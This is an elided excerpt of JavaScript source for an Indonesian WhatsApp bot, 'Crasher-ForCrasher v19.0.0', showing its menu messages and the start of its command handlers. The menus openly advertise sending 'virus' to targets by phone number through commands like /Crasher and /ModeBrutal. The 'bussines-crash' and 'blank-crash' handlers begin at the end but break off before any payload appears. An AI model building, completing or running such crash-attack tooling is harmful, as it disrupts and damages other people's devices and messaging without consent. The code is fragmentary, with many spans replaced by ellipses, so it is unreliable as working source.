...
ppuser = 'https://files.catbox.moe/sj7y0q.jpg'
}
            ...
            lubyz.sendMessage(m.chat, { 
                ...
                contextInfo: {
                    ...
                    externalAdReply: {
                        ...
                        body: ``,
                        previewType: "VIDEO",
                        thumbnailUrl: "https://files.catbox.moe/oxu42j.jpg",
                        thumbnail: ``,
...
Halo Sobat Selamat Datang Di Bot script 𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐯𝟏𝟗.𝟎.𝟎 , Kami bisa membantu ada dengan command di bawah ini sobat

𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐯𝟏𝟗.𝟎.𝟎

𖦹 BugMenu 
> untuk menampilkan menu bug yaa/to display the bug menu
𖦹 AksesMenu
> untuk mengakes orang lain memakai bot anda/to access other people using your bot
𖦹ToolsMenu
> untuk memperlihatkan menu tambahan yaitu tools/to show an additional menu, namely tools
𖦹Credits
> untuk memperlihatkan siapa saja yang support pada script ini/to show who supports this script
...
`
 await lubyz.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/oxu42j.jpg" },  
            caption: text12,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐯𝟏𝟗.𝟎.𝟎",
                    newsletterJid: `120363378749290420@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐯𝟏𝟗.𝟎.𝟎`,
                   mediaType: 3,
...
Halo Sobat selamat datang di Akses Menu , Akses Menu dapat mengakses orang lain memakai bot anda
Translate english :
Hello friends, welcome to Menu Access, Menu Access can access other people using your bot
...
`
await lubyz.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/sj7y0q.jpg" },  
            caption: text12,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
               ...
               externalAdReply: {
                   ...
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://files.catbox.moe/sj7y0q.jpg',
                   sourceUrl: `https://whatsapp.com/channel/0029Vb535HMHrDZhQft5nP06`
                }
            }
        },{ quoted: qloc }
...
Halo sobat selamat datang di Bot Sript 𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐯𝟏𝟗.𝟎.𝟎
> script di rancang oleh lubyzxmods , script di rancang untuk menyerang target yang bersalah
Trsanslate english :
> The script was designed by lubyzxmods, the script was designed to attack guilty targets

> Berikut Command² Bot/Following are the bot commands

𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐯𝟏𝟗.𝟎.𝟎

> Command di bawah dapat membantu ada untuk mengirim virus ke target

𐂯 /Crasher 𝟲𝟮𝘅𝘅𝘅
𐂯 /Ui-System 𝟲𝟮𝘅𝘅𝘅
𐂯 /Version19 𝟲𝟮𝘅𝘅𝘅 
𐂯 /ModeBrutal 𝟲𝟮𝘅𝘅𝘅 
𐂯 /Bercanda kids 𝟲𝟮𝘅𝘅𝘅
...
`
await lubyz.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/b50pyl.jpg" },  
            caption: text12,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
               ...
               externalAdReply: {
                   ...
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://files.catbox.moe/b50pyl.jpg',
                   sourceUrl: `https://whatsapp.com/channel/0029Vb535HMHrDZhQft5nP06`
                }
            }
        },{ quoted: qloc }
...
Hai Sobat selamat datang di tools menu , tools menu dapat di gunakan semacam meng hd kan foto,hidetag dan lain-lain
Trsanslate English :
Hi friends, welcome to the tools menu, the tools menu can be used to HD photos, hide tags and so on.

⌑𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐯𝟏𝟗.𝟎.𝟎⌑

⚝ Hd 
> Untuk MemperCantik Foto anda/To beautify your photos
⚝ Tagall 
> langsung meng tag semua mem groub/immediately mention all group members
⚝  Hidetag
> langsung meng tag semua mem groub/immediately mention all group members
⚝ kick
> Menendang Member/Kicking Members
♪ spotify
> Untuk Mencari Lagu Anda di Spotify menggunakan bot/To Search for Your Songs on Spotify use a bot
♫ Lagu
untuk mencari lagu anda di social media manapun menggunakan bot/to search for your songs on any social media using bots
...
await lubyz.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/5atsza.jpg" },  
            caption: text12,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
               ...
               externalAdReply: {
                   ...
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://files.catbox.moe/5atsza.jpg',
                   sourceUrl: `https://whatsapp.com/channel/0029Vb535HMHrDZhQft5nP06`
                }
            }
        },{ quoted: qloc }
...
reply(`
𝐓𝐇𝐀𝐍𝐊𝐒 𝐁𝐈𝐆 𝐓𝐎
𝐋𝐮𝐛𝐲𝐳𝐗𝐦𝐨𝐝𝐬 (𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫)
𝐉𝐮𝐬𝐭𝐢𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 (𝐅𝐫𝐢𝐞𝐧𝐝𝐬)

( 𝐃𝐀𝐍 𝐓𝐄𝐑𝐈𝐌𝐀𝐊𝐀𝐒𝐈𝐇 𝐁𝐔𝐀𝐓 𝐊𝐀𝐋𝐈𝐀𝐍 𝐒𝐄𝐌𝐔𝐀 𝐘𝐀𝐍𝐆 𝐒𝐔𝐃𝐀𝐇 𝐌𝐄𝐌𝐀𝐊𝐀𝐈 𝐒𝐂𝐑𝐈𝐏𝐓)

*INFO UPDATE SCRIPT*
https://whatsapp.com/channel/0029Vb535HMHrDZhQft5nP06/101
...
// CASE BUG 
case 'bussines-crash':
case 'bussines-attack':
case 'bussines-blank':
case 'bussines-ui':
case 'bussines-hardui':
case 'blank-crash': {
if (!isCmd) return;
if (!Access && !isPremium) return reply(msg.premium)
if (!q) return reply(`*Example :*${prefix + command} 62×××`)
